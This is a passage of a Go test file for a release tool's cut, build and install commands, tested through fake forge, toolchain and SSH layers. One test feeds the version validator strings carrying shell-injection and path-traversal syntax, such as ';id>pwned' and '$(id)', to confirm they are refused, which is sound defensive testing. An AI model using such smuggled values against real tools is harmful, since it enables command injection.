package release

import (
	"archive/tar"
	"bytes"
	"context"
	"crypto/sha256"
	"encoding/hex"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"sort"
	"strings"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"github.com/mas-bandwidth/nova-tools/internal/testbin"
)

// ---------------------------------------------------------------------------
// The fakes. Every edge this package has to the world outside the process is an
// interface, and these three are the whole of what a unit test here talks to:
// no gh, no ssh, no compiler, no network.
// ---------------------------------------------------------------------------

type fakeForge struct {
	head    map[string]string
	checks  map[string][]CheckRun
	tags    []string
	commits map[string][]Commit
	// files is what the compare endpoint names as touched, keyed the same way
	// as commits: `cut` classifies the range against the sensitive list and
	// the list of paths is the only input to that decision.
	files  map[string][]string
	tagged []string
	// messages is the annotation each tag OBJECT carries, keyed by tag: a
	// lightweight ref carries none, and the whole point of decision 2 is that
	// this map is not empty.
	messages  map[string]string
	failTag   error
	failHead  error
	failFiles error
	// headCalls counts the reads of the forge, so a test can assert that a
	// gate said to be in front of the forge really is in front of it.
	headCalls int
}

func (f *fakeForge) HeadSHA(_ context.Context, _, branch string) (string, error) {
	f.headCalls++
	if f.failHead != nil {
		return "", f.failHead
	}
	sha, ok := f.head[branch]
	if !ok {
		return "", fmt.Errorf("no such branch %s", branch)
	}
	return sha, nil
}
func (f *fakeForge) CheckRuns(_ context.Context, _, sha string) ([]CheckRun, error) {
	return f.checks[sha], nil
}
func (f *fakeForge) Tags(_ context.Context, _ string) ([]string, error) { return f.tags, nil }
func (f *fakeForge) Compare(_ context.Context, _, base, head string) ([]Commit, error) {
	return f.commits[base+"..."+head], nil
}
func (f *fakeForge) Files(_ context.Context, _, base, head string) ([]string, error) {
	if f.failFiles != nil {
		return nil, f.failFiles
	}
	return f.files[base+"..."+head], nil
}
func (f *fakeForge) Tag(_ context.Context, _, tag, sha, message string) error {
	if f.failTag != nil {
		return f.failTag
	}
	f.tagged = append(f.tagged, tag+" "+sha)
	if f.messages == nil {
		f.messages = map[string]string{}
	}
	f.messages[tag] = message
	return nil
}
func (f *fakeForge) TagMessage(_ context.Context, _, tag string) (string, error) {
	message, ok := f.messages[tag]
	if !ok {
		return "", fmt.Errorf("no tag object for %s", tag)
	}
	return message, nil
}

type fakeToolchain struct {
	calls []string
	fail  string // package whose build fails
	// platforms stands in for `go tool dist list`. A zero fakeToolchain
	// answers the fleet's three plus the two it could grow into, which is
	// enough for `--platform plan9-vax` to be the refusal it ought to be.
	platforms []string
	failList  error
}

func (b *fakeToolchain) Platforms(context.Context) ([]string, error) {
	if b.failList != nil {
		return nil, b.failList
	}
	if len(b.platforms) > 0 {
		return b.platforms, nil
	}
	return []string{"darwin/amd64", "darwin/arm64", "linux/amd64", "linux/arm64", "windows/amd64"}, nil
}

func (b *fakeToolchain) Build(_ context.Context, source, pkg, out, goos, goarch string, args []string) (string, error) {
	b.calls = append(b.calls, fmt.Sprintf("%s %s %s %s/%s %s", source, pkg, out, goos, goarch, strings.Join(args, " ")))
	if b.fail != "" && strings.HasSuffix(pkg, b.fail) {
		return "undefined: nope", fmt.Errorf("exit status 2")
	}
	if err := os.MkdirAll(filepath.Dir(out), 0o755); err != nil {
		return "", err
	}
	// A stub that is a real file with real bytes, so the checksum file the
	// caller writes is over something.
	return "", testbin.WriteExecutable(out, []byte("binary "+filepath.Base(out)+" "+strings.Join(args, " ")), 0o755)
}

type fakeSSH struct {
	runs    []string
	sends   []string
	fetches []string
	// answer is keyed by machine; a machine absent from it refuses.
	answer map[string]string
	refuse map[string]error
	// serves is the local directory a machine hands back from a Fetch,
	// standing in for `ssh host tar -cf -`.
	serves map[string]string
	// remoteSums is what `cat <dest>/SHA256SUMS` answers on that machine: the
	// checksum file it is already holding, if any. SHA256SUMS matching is not
	// the same fact as the artifacts verifying; missingNamed and corruptNamed
	// are how a test says the directory is a killed transfer's leftover.
	remoteSums map[string]string
	// missingNamed is artifact names SHA256SUMS lists that are not on disk.
	missingNamed map[string][]string
	// corruptNamed is artifact names whose bytes do not match SHA256SUMS.
	corruptNamed map[string][]string
	// landedSums is the checksum file Send last streamed to that machine, so a
	// verify of the .partial directory can answer after a re-stream.
	landedSums map[string]string
}

func (s *fakeSSH) Run(_ context.Context, machine string, argv []string) (string, error) {
	s.runs = append(s.runs, machine+": "+strings.Join(argv, " "))
	if err := s.refuse[machine]; err != nil {
		return "", err
	}
	// `cat <dir>/SHA256SUMS` is answered from remoteSums, so a test can say
	// the checksum file is present without a filesystem there.
	if len(argv) > 0 && argv[0] == "cat" {
		sums, ok := s.remoteSums[machine]
		if !ok {
			return "", fmt.Errorf("cat: %s: No such file or directory", argv[len(argv)-1])
		}
		return sums, nil
	}
	// `cd <dir> && ( sha256sum -c SHA256SUMS || shasum ... )` is the verify
	// adopt runs against a final dir and against the .partial staging dir.
	if len(argv) > 0 && argv[0] == "cd" {
		return s.verify(machine, argv[1])
	}
	return s.answer[machine], nil
}
func (s *fakeSSH) Send(_ context.Context, machine, dir, dest string) (string, error) {
	s.sends = append(s.sends, machine+": "+dir+" -> "+dest)
	if err := s.refuse[machine]; err != nil {
		return "", err
	}
	body, err := os.ReadFile(filepath.Join(dir, SumsFile))
	if err != nil {
		return "", err
	}
	if s.landedSums == nil {
		s.landedSums = map[string]string{}
	}
	s.landedSums[machine] = string(body)
	return "", nil
}

func (s *fakeSSH) verify(machine, dir string) (string, error) {
	if strings.Contains(dir, ".partial/") || strings.HasSuffix(dir, ".partial") {
		sums, ok := s.landedSums[machine]
		if !ok {
			return "", fmt.Errorf("sha256sum: %s: No such file or directory", SumsFile)
		}
		return checksumOKLines(sumFileNames(sums), nil, nil), nil
	}
	sums, ok := s.remoteSums[machine]
	if !ok {
		return "", fmt.Errorf("sha256sum: %s: No such file or directory", SumsFile)
	}
	names := sumFileNames(sums)
	missing, corrupt := s.missingNamed[machine], s.corruptNamed[machine]
	if len(missing) > 0 || len(corrupt) > 0 {
		return checksumOKLines(names, missing, corrupt), fmt.Errorf("sha256sum: WARNING: %d computed checksum did NOT match", len(missing)+len(corrupt))
	}
	return checksumOKLines(names, nil, nil), nil
}

func sumFileNames(body string) []string {
	var names []string
	for _, line := range strings.Split(strings.TrimSpace(body), "\n") {
		if _, name, ok := strings.Cut(line, "  "); ok && name != "" {
			names = append(names, name)
		}
	}
	return names
}

func checksumOKLines(names, missing, corrupt []string) string {
	miss, cor := map[string]bool{}, map[string]bool{}
	for _, n := range missing {
		miss[n] = true
	}
	for _, n := range corrupt {
		cor[n] = true
	}
	var b strings.Builder
	for _, n := range names {
		switch {
		case miss[n]:
			fmt.Fprintf(&b, "sha256sum: %s: No such file or directory\n%s: FAILED open or read\n", n, n)
		case cor[n]:
			fmt.Fprintf(&b, "%s: FAILED\n", n)
		default:
			fmt.Fprintf(&b, "%s: OK\n", n)
		}
	}
	return b.String()
}

// Fetch stands in for `ssh host tar -cf - .` by copying the local directory the
// test registered in serves, so a `--from host:dir` run exercises the staging,
// the verification and the fan-out with no network and no tar binary.
func (s *fakeSSH) Fetch(_ context.Context, machine, dir, dest string) (string, error) {
	s.fetches = append(s.fetches, machine+": "+dir+" -> "+dest)
	if err := s.refuse[machine]; err != nil {
		return "", err
	}
	source, ok := s.serves[machine]
	if !ok {
		return "", fmt.Errorf("tar: %s: Cannot open: No such file or directory", dir)
	}
	if err := os.MkdirAll(dest, 0o755); err != nil {
		return "", err
	}
	entries, err := os.ReadDir(source)
	if err != nil {
		return "", err
	}
	for _, e := range entries {
		if e.IsDir() {
			continue
		}
		// Link, never copy: these are built executables going into a fixture install
		// root, and macOS assesses every fresh copy on its first exec (internal/testbin).
		if err := testbin.Place(filepath.Join(source, e.Name()), filepath.Join(dest, e.Name())); err != nil {
			return "", err
		}
	}
	return "", nil
}

// installRun finds the `release install` command a machine was given. adopt
// also asks each machine what it already holds, so the install is no longer
// simply the first thing run -- and a test that indexes by position is a test
// that breaks every time the verb learns to ask one more question.
func installRun(t *testing.T, s *fakeSSH, machine string) string {
	t.Helper()
	for _, run := range s.runs {
		if strings.HasPrefix(run, machine+": ") && strings.Contains(run, "release install") {
			return run
		}
	}
	require.FailNowf(t, "assertion failed", "%s was never given a release install: %v", machine, s.runs)
	return ""
}

func at(t *testing.T) time.Time {
	t.Helper()
	when, err := time.Parse(time.RFC3339, "2026-09-18T09:00:00Z")
	if err != nil {
		require.NoError(t, err, err)
	}
	return when
}

func greenRuns() []CheckRun {
	return []CheckRun{
		{Name: "ci", Status: "completed", Conclusion: "success"},
		{Name: "certification", Status: "completed", Conclusion: "success"},
		{Name: "lint", Status: "completed", Conclusion: "skipped"},
	}
}

func cutDeps(t *testing.T, f Forge) Deps {
	t.Helper()
	return Deps{Forge: f, Now: func() time.Time { return at(t) }, Spend: noSpend()}
}

// ---------------------------------------------------------------------------
// cut
// ---------------------------------------------------------------------------

// A tag is a claim about source, and the one thing a release must never do is
// make that claim about a commit nobody vouched for. release.yml has said so
// since v0.15.0; this is the same refusal one step earlier, where the person
// cutting the release is still at the keyboard.
func TestCutRefusesAShaWhoseChecksAreNotGreen(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct {
		name  string
		runs  []CheckRun
		wants string
	}{
		{"a failure", []CheckRun{{Name: "ci", Status: "completed", Conclusion: "failure"}}, "ci"},
		{"still running", []CheckRun{{Name: "ci", Status: "in_progress"}}, "ci"},
		{"nothing at all", nil, "no check"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			f := &fakeForge{
				head:   map[string]string{"main": "abc123abc123"},
				checks: map[string][]CheckRun{"abc123abc123": tc.runs},
			}
			var out, errs bytes.Buffer
			code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main",
				"--version", "v0.16.0", "--changelog", filepath.Join(t.TempDir(), "CHANGELOG.md")},
				&out, &errs, cutDeps(t, f))
			if code != 2 {
				require.Equal(t, 2, code, "green-gate did not refuse: code=%d out=%s errs=%s", code, out.String(), errs.String())
			}
			if !strings.Contains(errs.String(), "CUT REFUSED") || !strings.Contains(errs.String(), tc.wants) {
				require.FailNowf(t, "assertion failed", "refusal does not name the evidence: %s", errs.String())
			}
			if len(f.tagged) != 0 {
				require.Len(t, f.tagged, 0, "a red sha was tagged: %v", f.tagged)
			}
		})
	}
}

// A tag is a claim about source, and the one way to make it about a commit CI
// never vouched for is the cut's own waiver: `--waive-ci "<who, when>"`. What
// it let past is written into the tag annotation and the section that travels
// by git, so the answer to "why did this ship red" is the tag itself and never
// a hand-made tag outside the tool.
func TestACutWithAWaiverRecordsItInTheTag(t *testing.T) {
	t.Parallel()

	red := []CheckRun{
		{Name: "ci", Status: "completed", Conclusion: "failure"},
		{Name: "certification", Status: "completed", Conclusion: "failure"},
	}
	redForge := func() *fakeForge {
		f := cutForge()
		f.checks = map[string][]CheckRun{"abc123abc123def": red}
		return f
	}

	t.Run("a red or missing CI is refused without the flag", func(t *testing.T) {
		t.Parallel()
		for _, tc := range []struct {
			name string
			runs []CheckRun
		}{
			{"a failure", red},
			{"no check at all", nil},
		} {
			t.Run(tc.name, func(t *testing.T) {
				t.Parallel()
				f := cutForge()
				f.checks = map[string][]CheckRun{"abc123abc123def": tc.runs}
				var out, errs bytes.Buffer
				code := Run("nova-update", cutArgs(changelogIn(t, t.TempDir())), &out, &errs, cutDeps(t, f))
				if code != 2 {
					require.Equal(t, 2, code, "a red CI was cut without a waiver: code=%d out=%s errs=%s", code, out.String(), errs.String())
				}
				assert.Empty(t, f.tagged, "a red sha was tagged without a waiver")
			})
		}
	})

	t.Run("the waiver and the red checks are in the tag and the section", func(t *testing.T) {
		t.Parallel()
		f := redForge()
		changelog := changelogIn(t, t.TempDir())
		const who = "the owner, 2026-10-09"
		var out, errs bytes.Buffer
		code := Run("nova-update", cutArgs(changelog, "--waive-ci", who), &out, &errs, cutDeps(t, f))
		if code != 0 {
			require.Equal(t, 0, code, "the waiver did not let the cut past: code=%d out=%s errs=%s", code, out.String(), errs.String())
		}
		require.Len(t, f.tagged, 1, "tagged %v", f.tagged)

		message := f.messages["v0.16.0"]
		assert.Contains(t, message, "CI waived: "+who, "the tag annotation does not carry the waiver:\n%s", message)
		for _, check := range []string{"ci=failure", "certification=failure"} {
			assert.Contains(t, message, check, "the tag annotation does not name the red check %q:\n%s", check, message)
		}

		raw, err := os.ReadFile(changelog)
		require.NoError(t, err)
		section := string(raw)
		assert.Contains(t, section, "CI waived: "+who, "the section does not carry the waiver:\n%s", section)
		for _, check := range []string{"ci=failure", "certification=failure"} {
			assert.Contains(t, section, check, "the section does not name the red check %q:\n%s", check, section)
		}
	})

	t.Run("an empty waiver is refused", func(t *testing.T) {
		t.Parallel()
		for _, empty := range []string{"", "   "} {
			t.Run(fmt.Sprintf("%q", empty), func(t *testing.T) {
				t.Parallel()
				f := redForge()
				var out, errs bytes.Buffer
				code := Run("nova-update", cutArgs(changelogIn(t, t.TempDir()), "--waive-ci", empty), &out, &errs, cutDeps(t, f))
				assert.Equal(t, 2, code, "an empty waiver was accepted: code=%d out=%s errs=%s", code, out.String(), errs.String())
				assert.Empty(t, f.tagged, "an empty waiver tagged")
			})
		}
	})
}

func cutForge() *fakeForge {
	return &fakeForge{
		head:   map[string]string{"main": "abc123abc123def"},
		checks: map[string][]CheckRun{"abc123abc123def": greenRuns()},
		tags:   []string{"v0.15.3", "v0.9.0", "v0.15.10", "not-a-version"},
		commits: map[string][]Commit{
			"v0.15.10...abc123abc123def": {
				{SHA: "111", Message: "feat: nova-pulse hygiene, the path-safe bench cleanup verbs (#1142) (#1253)\n\nbody"},
				{SHA: "222", Message: "integration-2: 5 pre-tested PRs (deterministic idle watch) (#1312)\n\nMembers:\n- #1301 idle watch\n- #1305 sandbox parent guard\n"},
				{SHA: "333", Message: "a commit with no pull request number"},
			},
		},
	}
}

func TestCutWritesTheChangelogTagsAndSaysWhatItDid(t *testing.T) {
	t.Parallel()

	f := cutForge()
	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
	if err := os.WriteFile(path, []byte("# nova-tools changelog\n\n## v0.15.10 — 2026-09-17\n\n- #1 older\n"), 0o644); err != nil {
		require.NoError(t, err, err)
	}
	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"cut", "--repo", "mas-bandwidth/nova-tools", "--from", "main",
		"--version", "v0.16.0", "--changelog", path}, &out, &errs, cutDeps(t, f))
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, errs.String())
	}
	// The one line a person reads off the terminal.
	want := "RELEASE CUT version=v0.16.0 sha=abc123abc123def prs=2"
	if !strings.Contains(out.String(), want) {
		require.Contains(t, out.String(), want, "no cut line %q in:\n%s", want, out.String())
	}
	if len(f.tagged) != 1 || f.tagged[0] != "v0.16.0 abc123abc123def" {
		require.FailNowf(t, "assertion failed", "tagged %v", f.tagged)
	}
	body, err := os.ReadFile(path)
	if err != nil {
		require.NoError(t, err, err)
	}
	got := string(body)
	// The previous tag is the HIGHEST version tag, not the first one listed:
	// v0.15.10 is after v0.15.3, which a lexical sort gets backwards.
	for _, s := range []string{
		"## v0.16.0 — 2026-09-18",
		"since v0.15.10",
		"#1253",
		"feat: nova-pulse hygiene, the path-safe bench cleanup verbs (#1142)",
		"#1312",
		"integration-2: 5 pre-tested PRs (deterministic idle watch)",
		"#1301",
		"#1305",
	} {
		if !strings.Contains(got, s) {
			assert.Contains(t, got, s, "the new section does not carry %q:\n%s", s, got)
		}
	}
	// Prepended, never overwritten: the old section is still there and the new
	// one is above it.
	if !strings.Contains(got, "## v0.15.10 — 2026-09-17") {
		require.Contains(t, got, "## v0.15.10 — 2026-09-17", "the previous section was lost:\n%s", got)
	}
	if strings.Index(got, "## v0.16.0") > strings.Index(got, "## v0.15.10") {
		require.FailNowf(t, "assertion failed", "the new section is below the old one:\n%s", got)
	}
	if !strings.HasPrefix(got, "# nova-tools changelog\n") {
		require.FailNowf(t, "assertion failed", "the file's title was displaced:\n%s", got)
	}
}

// A commit whose subject carries no (#n) is not a pull request and is not a
// changelog line; the count says 2 because two of the three commits were.
func TestCutCountsOnlyCommitsThatNameAPullRequest(t *testing.T) {
	t.Parallel()

	prs := PullRequests(cutForge().commits["v0.15.10...abc123abc123def"])
	if len(prs) != 2 {
		require.Len(t, prs, 2, "prs=%d %v", len(prs), prs)
	}
	sort.Slice(prs, func(i, j int) bool { return prs[i].Number < prs[j].Number })
	if prs[0].Number != 1253 || prs[0].Title != "feat: nova-pulse hygiene, the path-safe bench cleanup verbs (#1142)" {
		require.FailNowf(t, "assertion failed", "first pr %+v", prs[0])
	}
	// The batch's members come out of its own body, so a batch line does not
	// hide five pieces of work behind one number.
	if got := fmt.Sprint(prs[1].Members); got != "[1301 1305]" {
		require.Equal(t, "[1301 1305]", got, "members %s", got)
	}
}

func TestCutDryRunWritesNothingAndTagsNothing(t *testing.T) {
	t.Parallel()

	f := cutForge()
	path := filepath.Join(t.TempDir(), "CHANGELOG.md")
	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"cut", "--repo", "o/n", "--from", "main", "--version", "v0.16.0",
		"--changelog", path, "--dry-run"}, &out, &errs, cutDeps(t, f))
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, errs.String())
	}
	if !strings.Contains(out.String(), "RELEASE CUT version=v0.16.0") || !strings.Contains(out.String(), "dry-run=yes") {
		require.FailNowf(t, "assertion failed", "dry run says nothing about itself: %s", out.String())
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		require.FailNowf(t, "assertion failed", "--dry-run wrote %s", path)
	}
	if len(f.tagged) != 0 {
		require.Len(t, f.tagged, 0, "--dry-run tagged %v", f.tagged)
	}
}

func TestCutRefusesAVersionNoLaterStepCouldCheck(t *testing.T) {
	t.Parallel()

	for _, v := range []string{"", "0.16.0", "v0.16", "v0.16.0 rc1", "v0.16.0%s", "v0.16=0"} {
		if err := ValidVersion(v); err == nil {
			assert.Error(t, err, "accepted %q", v)
		}
	}
	for _, v := range []string{"v0.16.0", "v1.0.0-rc1", "v0.15.3-0.20260918044559-d576bf6bbabb"} {
		if err := ValidVersion(v); err != nil {
			assert.NoError(t, err, "refused %q: %v", v, err)
		}
	}
}

func TestValidVersionRefusesAPrereleaseSuffixCarryingShellSyntax(t *testing.T) {
	t.Parallel()

	for _, v := range []string{
		"v9.9.9-;id>pwned",
		"v9.9.9-x/../../pwn",
		"v9.9.9-$(id)",
		"v9.9.9-a b",
		"v9.9.9-`id`",
	} {
		if err := ValidVersion(v); err == nil {
			assert.Error(t, err, "accepted %q", v)
		}
	}
	for _, v := range []string{
		"v0.15.3-0.20260918044559-d576bf6bbabb",
		"v1.0.0-rc1",
	} {
		if err := ValidVersion(v); err != nil {
			assert.NoError(t, err, "refused %q: %v", v, err)
		}
	}
}

func TestEveryReleaseVerbNamesItsMissingFlagsAtOnce(t *testing.T) {
	t.Parallel()

	var out, errs bytes.Buffer
	code := Run("nova-update", []string{"cut"}, &out, &errs, Deps{})
	if code != 2 {
		require.Equal(t, 2, code, code)
	}
	for _, flag := range []string{"--repo", "--from", "--version", "--changelog"} {
		if !strings.Contains(errs.String(), flag) {
			require.Contains(t, errs.String(), flag, "missing %s: %s", flag, errs.String())
		}
	}
	if strings.Count(errs.String(), "\n") > 1 {
		require.FailNowf(t, "assertion failed", "the refusal printed a banner: %s", errs.String())
	}
}

// ---------------------------------------------------------------------------
// build
// ---------------------------------------------------------------------------

func sourceTree(t *testing.T) string {
	t.Helper()
	dir := t.TempDir()
	for _, tool := range []string{"nova-update", "nova-bus", "nova-worker"} {
		if err := os.MkdirAll(filepath.Join(dir, "cmd", tool), 0o755); err != nil {
			require.NoError(t, err, err)
		}
		if err := os.WriteFile(filepath.Join(dir, "cmd", tool, "main.go"), []byte("package main\n"), 0o644); err != nil {
			require.NoError(t, err, err)
		}
	}
	// Not a nova tool: the build loop ships cmd/nova-*, so this must not appear.
	if err := os.MkdirAll(filepath.Join(dir, "cmd", "helper"), 0o755); err != nil {
		require.NoError(t, err, err)
	}
	return dir
}

func TestBuildStampsEveryToolAndWritesOneChecksumFile(t *testing.T) {
	t.Parallel()

	source, out := sourceTree(t), t.TempDir()
	tc := &fakeToolchain{}
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", out, "--source", source},
		&o, &e, Deps{Toolchain: tc})
	if code != 0 {
		require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
	}
	if len(tc.calls) != 3 {
		require.Len(t, tc.calls, 3, "built %d packages: %v", len(tc.calls), tc.calls)
	}
	for _, call := range tc.calls {
		if !strings.Contains(call, "-trimpath") {
			require.Contains(t, call, "-trimpath", "no -trimpath: %s", call)
		}
		// The stamp is what makes `nova-X version` answer the release rather
		// than `devel`; an empty -X is a legal linker flag and was #118.
		if !strings.Contains(call, "-ldflags -s -w -X main.version=v0.16.0") {
			require.Contains(t, call, "-ldflags -s -w -X main.version=v0.16.0", "no version stamp: %s", call)
		}
		if !strings.Contains(call, "cmd/nova-") {
			require.Contains(t, call, "cmd/nova-", "built something that is not a nova tool: %s", call)
		}
	}
	plat := runtime.GOOS + "-" + runtime.GOARCH
	dir := filepath.Join(out, "v0.16.0", plat)
	sums, err := os.ReadFile(filepath.Join(dir, "SHA256SUMS"))
	if err != nil {
		require.NoError(t, err, err)
	}
	if n := strings.Count(strings.TrimSpace(string(sums)), "\n") + 1; n != 3 {
		require.Equal(t, 3, n, "SHA256SUMS has %d lines:\n%s", n, sums)
	}
	// The checksum file cannot list itself, and every line is over a file that
	// is really there with really that hash.
	if strings.Contains(string(sums), "SHA256SUMS") {
		require.NotContains(t, string(sums), "SHA256SUMS", "SHA256SUMS lists itself:\n%s", sums)
	}
	for _, line := range strings.Split(strings.TrimSpace(string(sums)), "\n") {
		want, name, ok := strings.Cut(line, "  ")
		if !ok {
			require.True(t, ok, "not a sha256sum line: %q", line)
		}
		body, err := os.ReadFile(filepath.Join(dir, name))
		if err != nil {
			require.NoError(t, err, err)
		}
		sum := sha256.Sum256(body)
		if got := hex.EncodeToString(sum[:]); got != want {
			require.Equal(t, want, got, "%s: %s recorded, %s on disk", name, want, got)
		}
	}
	if !strings.Contains(o.String(), "RELEASE BUILT version=v0.16.0") || !strings.Contains(o.String(), "tools=3") {
		require.FailNowf(t, "assertion failed", "no build line: %s", o.String())
	}
}

func TestBuildRefusesWhenOneToolDoesNotCompile(t *testing.T) {
	t.Parallel()

	source, out := sourceTree(t), t.TempDir()
	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", out, "--source", source},
		&o, &e, Deps{Toolchain: &fakeToolchain{fail: "nova-worker"}})
	if code != 1 {
		require.Equal(t, 1, code, "code=%d", code)
	}
	if !strings.Contains(e.String(), "nova-worker") {
		require.Contains(t, e.String(), "nova-worker", "the failure does not name the tool: %s", e.String())
	}
	// A half-built directory must not carry a checksum file: SHA256SUMS over
	// two of three tools is a file that agrees with itself and with nothing.
	if _, err := os.Stat(filepath.Join(out, "v0.16.0", runtime.GOOS+"-"+runtime.GOARCH, "SHA256SUMS")); err == nil {
		require.Error(t, err, "a failed build still wrote SHA256SUMS")
	}
}

func TestBuildRefusesASourceTreeWithNoNovaTools(t *testing.T) {
	t.Parallel()

	var o, e bytes.Buffer
	code := Run("nova-update", []string{"build", "--version", "v0.16.0", "--out", t.TempDir(), "--source", t.TempDir()},
		&o, &e, Deps{Toolchain: &fakeToolchain{}})
	if code != 2 || !strings.Contains(e.String(), "no cmd/nova-") {
		require.FailNowf(t, "assertion failed", "code=%d errs=%s", code, e.String())
	}
}

// ---------------------------------------------------------------------------
// install
// ---------------------------------------------------------------------------

// hostPlatform is what an empty --platform resolves to. A test that wants a
// SPECIFIC platform passes one; a test that does not care passes "" and gets
// this. No test here assembles a tool's FILE NAME out of runtime.GOOS itself:
// doing that is how the Windows leg failed, with the artifacts written as
// nova-wake.exe and every assertion asking after nova-wake.
var hostPlatform = runtime.GOOS + "-" + runtime.GOARCH

// assertRunnable is what "this tool was installed and can be run" means, on
// each of the two kinds of filesystem this suite runs on.
//
// THE HOST DECIDES THIS, NOT THE TARGET -- and that is the distinction the
// sharded Windows leg found. Everything else about a platform in these tests is
// the TARGET's (a windows release is called nova-bus.exe whoever builds it), but
// a file's mode is a property of the filesystem the bytes actually landed on. On
// a windows runner BOTH the windows-amd64 case and the linux-amd64 one report
// `-rw-rw-rw-`, because NTFS has no execute bit for Go to report: os.Chmod there
// moves one read-only attribute and nothing else. An assertion on 0o111 is not
// false on windows, it is meaningless -- it cannot fail for a real defect and it
// cannot pass for a real guarantee, which is the same trap #1262 fell into.
//
// So what is asserted is what the install actually promises and what each
// filesystem can actually answer: the file is there, under the target's name,
// it is a regular file, and it carries the artifact's bytes rather than an empty
// placeholder. On unix the execute bit is asserted on top, because there it is
// the difference between an installed tool and one nobody can run.
func assertRunnable(t *testing.T, path string) {
	t.Helper()
	info, err := os.Stat(path)
	if err != nil {
		require.NoError(t, err, "%s was not installed: %v", filepath.Base(path), err)
	}
	if !info.Mode().IsRegular() {
		require.FailNowf(t, "assertion failed", "%s is not a regular file: %v", filepath.Base(path), info.Mode())
	}
	// The fixture toolchain writes "binary <name> <build args>", so this also
	// says the bytes are the ARTIFACT's and not a leftover or an empty file --
	// a check every platform can make, and a stronger one than the mode bit.
	body, err := os.ReadFile(path)
	if err != nil {
		require.NoError(t, err, "%s cannot be read back: %v", filepath.Base(path), err)
	}
	if !strings.HasPrefix(string(body), "binary "+filepath.Base(path)+" ") {
		require.FailNowf(t, "assertion failed", "%s does not hold the built artifact's bytes: %q", filepath.Base(path), body)
	}
	if runtime.GOOS == "windows" {
		return // no execute bit exists here; the checks above are the whole answer
	}
	if info.Mode().Perm()&0o111 == 0 {
		require.FailNowf(t, "assertion failed", "%s is not executable: %v", filepath.Base(path), info.Mode())
	}
}

func platformOf(t *testing.T, flagValue string) (string, string) {
	t.Helper()
	goos, goarch, err := Platform(flagValue)
	if err != nil {
		require.NoError(t, err, err)
	}
	return goos, goarch
}

// built lays down what `build` writes for one platform, so the install and
// adopt tests start from the artifact rather than from a hand-made directory
// that might not match it -- including its file NAMES, which is the whole of
// what went wrong. platform "" means this host.
func built(t *testing.T, version, platform string, tools ...string) string {
	t.Helper()
	out := t.TempDir()
	source := t.TempDir()
	for _, tool := range tools {
		if err := os.MkdirAll(filepath.Join(source, "cmd", tool), 0o755); err != nil {
			require.NoError(t, err, err)
		}
		if err := os.WriteFile(filepath.Join(source, "cmd", tool, "main.go"), []byte("package main\n"), 0o644); err != nil {
			require.NoError(t, err, err)
		}
	}
	args := []string{"build", "--version", version, "--out", out, "--source", source}
	if platform != "" {
		args = append(args, "--platform", platform)
	}
	var o, e bytes.Buffer
	if code := Run("nova-update", args, &o, &e, Deps{Toolchain: &fakeToolchain{}}); code != 0 {
		require.Equal(t, 0, code, "fixture build: %d %s", code, e.String())
	}
	return out
}

// The build names every artifact for the TARGET, so a windows release is a
// directory of .exe files whatever host built it -- which is what lets the
// install below find them and the adopt below run one of them.
func TestBuildNamesArtifactsForTheTargetNotTheHost(t *testing.T) {
	t.Parallel()

	for _, tc := range []struct{ platform, want string }{
		{"windows-amd64", "nova-bus.exe"},
		{"linux-amd64", "nova-bus"},
		{"darwin-arm64", "nova-bus"},
	} {
		t.Run(tc.platform, func(t *testing.T) {
			goos, goarch := platformOf(t, tc.platform)
			dir := ArtifactDir(built(t, "v0.16.0", tc.platform, "nova-bus"), "v0.16.0", goos, goarch)
			arts, err := ReadSums(dir)
			if err != nil {
				require.NoError(t, err, err)
			}
			if len(arts) != 1 || arts[0].Name != tc.want {
				require.FailNowf(t, "assertion failed", "%s built %v, want %s", tc.platform, arts, tc.want)
			}
			if _, err := os.Stat(filepath.Join(dir, tc.want)); err != nil {
				require.NoError(t, err, "%s is not on disk: %v", tc.want, err)
			}
		})
	}
}

// The Windows PR leg of integration-4 failed here: on a windows host the build
// writes nova-wake.exe, this test pre-installed a bare nova-wake, and its probe
// matched a bare base name -- so nothing skipped and the count was wrong. The
// platform is now NAMED rather than inherited from whichever host runs the
// suite, and windows is one of the names, so this holds on every runner and
// also says what a windows release is supposed to look like.
func TestInstallVerifiesRenamesAndSkipsWhatIsAlreadyCurrent(t *testing.T) {
	t.Parallel()

	for _, platform := range []string{"", "linux-amd64", "windows-amd64"} {
		name := platform
		if name == "" {
			name = "this host " + hostPlatform
		}
		t.Run(name, func(t *testing.T) {
			goos, goarch := platformOf(t, platform)
			from := built(t, "v0.16.0", platform, "nova-bus", "nova-worker", "nova-wake")
			bin := t.TempDir()
			// nova-wake already holds the artifact's bytes; the other two do
			// not. It is written under the name the TARGET installs it as.
			// Skip is the sum, so these bytes are the artifact's
			// (security#72 finding 2).
			current := ToolFile("nova-wake", goos)
			wake := filepath.Join(bin, current)
			if err := testbin.Place(filepath.Join(ArtifactDir(from, "v0.16.0", goos, goarch), current), wake); err != nil {
				require.NoError(t, err, err)
			}
			before, err := os.Stat(wake)
			if err != nil {
				require.NoError(t, err, err)
			}
			args := []string{"install", "--from", from, "--version", "v0.16.0", "--bin", bin}
			if platform != "" {
				args = append(args, "--platform", platform)
			}
			var o, e bytes.Buffer
			var probed []string
			code := Run("nova-update", args, &o, &e, Deps{VersionOf: func(_ context.Context, p string) (string, error) {
				probed = append(probed, filepath.Base(p))
				if filepath.Base(p) == current {
					return "nova-wake v0.16.0 " + goos + "/amd64", nil
				}
				return "", fmt.Errorf("no such file")
			}})
			if code != 0 {
				require.Equal(t, 0, code, "code=%d errs=%s", code, e.String())
			}
			if want := "RELEASE INSTALLED version=v0.16.0 tools=2 skipped=1"; !strings.Contains(o.String(), want) {
				require.Contains(t, o.String(), want, "no install line %q in:\n%s", want, o.String())
			}
